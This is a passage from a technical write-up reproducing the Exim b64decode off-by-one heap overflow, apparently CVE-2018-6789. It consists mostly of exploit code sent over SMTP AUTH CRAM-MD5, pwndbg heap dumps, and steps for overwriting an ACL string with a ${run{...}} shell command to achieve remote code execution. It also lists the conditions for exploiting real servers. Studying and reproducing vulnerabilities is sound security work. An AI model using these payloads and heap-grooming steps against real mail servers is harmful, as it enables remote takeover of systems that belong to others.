be extended from 0x00 to 0xf0.
Second, we assume that the original chunk size of the second chunk is 0x2021,
and then it is modified to 0x20f1. We also need to consider whether
chunk+0x20f1 is controllable, because we need to forge a fake chunk to bypass
the security check of free function .
After several times of debugging, it is found that when the size of the second
chunk is 0x2001, it is more convenient for subsequent use.
###### CHUNK3
The third chunk only requires to be greater than a minimum size (0x2020) that
a `store_get` request can get.
##### STEP 4
We will trigger the `off by one` vulnerability according to the third step.
    payload1 = "HfHf"*0xaae
    p.sendline("AUTH CRAM-MD5")
    p.sendline(payload1[:-1])
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x1d191b0,
      bk = 0x2008,
      fd_nextsize = 0xf11ddff11ddff11d,
      bk_nextsize = 0x1ddff11ddff11ddf
    }
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d19290 PREV_INUSE IS_MMAPED {
      prev_size = 0x6363636363636363,
      size = 0x6363636363636363,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
And construct a fake chunk in the third chunk.
    payload = p64(0x20f0)+p64(0x1f31)
    p.sendline("AUTH CRAM-MD5")
    p.sendline((payload*484).encode("base64").replace("\n",""))
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x1d191b0,
      bk = 0x2008,
      fd_nextsize = 0xf11ddff11ddff11d,
      bk_nextsize = 0x1ddff11ddff11ddf
    }
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d19290 PREV_INUSE {
      prev_size = 0xf0,
      size = 0x1f31,
      fd = 0x20f0,
      bk = 0x1f31,
      fd_nextsize = 0x20f0,
      bk_nextsize = 0x1f31
    }
    0x1d1b1c0 PREV_INUSE {
      prev_size = 0x2020,
      size = 0x4041,
      fd = 0x7f9520918288,
      bk = 0x7f9520918288,
      fd_nextsize = 0x1d1b1c0,
      bk_nextsize = 0x1d1b1c0
    }
##### STEP 5
By releasing `sender_host_name`, an original 0x2000 chunk is expanded to
0x20f0, but it does not trigger `smtp_reset`.
    p.sendline("EHLO a+")
    # heap
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x1d21240,
      bk = 0x7f9520917b78,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d19290 {
      prev_size = 0x20f0,
      size = 0x1f30,
      fd = 0x20f0,
      bk = 0x1f31,
      fd_nextsize = 0x20f0,
      bk_nextsize = 0x1f31
    }
##### STEP 6
Meh provides a way to RCE without leaking the address.
Exim has an `expand_string` function. When it processes the arguments with
`${run{xxxxx}}` or `xxxx`, it will be executed as a shell command.
The `acl_check` function checks the configuration of each command, and then
calls the `expand_string` function on the string of configuration information.
The configuration information of my recurrence environment is as follows:
    pwndbg> x/18gx &acl_smtp_vrfy
    0x6ed848 :   0x0000000000000000  0x0000000000000000
    0x6ed858 :   0x0000000001cedac0  0x0000000000000000
    0x6ed868 :    0x0000000000000000  0x0000000000000000
    0x6ed878 :   0x0000000000000000  0x0000000000000000
    0x6ed888 :   0x0000000000000000  0x0000000000000000
    0x6ed898 :   0x0000000000000000  0x0000000000000000
    0x6ed8a8 :   0x0000000001cedad0  0x0000000000000000
    0x6ed8b8 :   0x0000000001cedae0  0x0000000000000000
So I have three commands `rcpt`, `data` and `auth` to use.
For example, the current content of the `0x0000000001cedae0` address is:
    Pwndbg> x/s 0x0000000001cedae0
    0x1cedae0: "acl_check_auth"
If I change the string to `${run{/usr/bin/touch /tmp/pwned}}`, then when I
send the `AUTH` command to the server, exim will execute `/usr/bin/touch
/tmp/pwned`.
Modify the next pointer of `storeblock` to store the heap address of the
`acl_check_xxxx` string -> call smtp_reset -> the heap block storing the
`acl_check_xxxx` string is released into the unsortedbin -> apply for a heap,
and when the address of the heap is the same as the heap block storing
`acl_check_xxxx` string, we can override the string that the string executes
for the command -> RCE
##### STEP 7
According to the last step, we first need to modify the `next` pointer. The
original size of the second chunk is 0x2000, and it will be 0x20f0 after
modification. The address of the next `storeblock` is chunk+0x2000 which is
also the address of the `next` pointer.
So we apply for a chunk of 0x2020 and we can override the `next` pointer:
    P.sendline("AUTH CRAM-MD5")
    P.sendline(base64.b64encode(payload*501+p64(0x2021)+p64(0x2021)+p32(address)))
The second chunk is allocated when the `AUTH CRAM-MD5` command is executed, so
the memory of `b64decode` is obtained from `next_yield`.
This means we can control the size of `yield_length` when executing
`b64decode`. At first, one of my ideas is to use the `off by one`
vulnerability to modify `next`, which is, from my point of view, what meh said
about `partial write`. But I fialed.
    Pwndbg> x/16gx 0x1d171a0+0x2000
    0x1d191a0: 0x0063636363636363 0x0000000000002021
    0x1d191b0: 0x0000000001d171b0 0x0000000000002000
The current value of the `next` pointer is 0x1d171b0. I used to try to modify
1-2 bytes, but the heap address of the `acl_check_xxx` character is 0x1ced980.
We will need to modify 3 bytes, so this idea won't work.
So there is another idea. Because exim handles each socket connection by fork,
so we can blast the base address of the heap, which only needs 2bytes.
##### STEP 8
After solving this problem, it is to fill the heap, and then modify the string
that `acl_check_xxx` pointed to.
Then attach the screenshot:
#### Summary
I have seen others'
[exp](https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789 "exp") on
github, and they used blasting, so it is possible that I did not really
understood `partial write`.
In addition, by comparing with exp on github, it is found that for different
versions of exim, `acl_check_xxx` have different heap offsets. So if you need
RCE exim, you need to meet the following conditions:
  1. Versions with the vulnerability (less than or equal to the version of commit 38e3d2dff7982736f1e6833e06d4aab4652f337a)
  2. Enable CRAM-MD5 authentication, or other authentication with b64decode function
  3. Need the binary of the exim to calculate the heap offset
  4. Need the startup parameters of exim
#### Reference
1.
2.
3.
* * *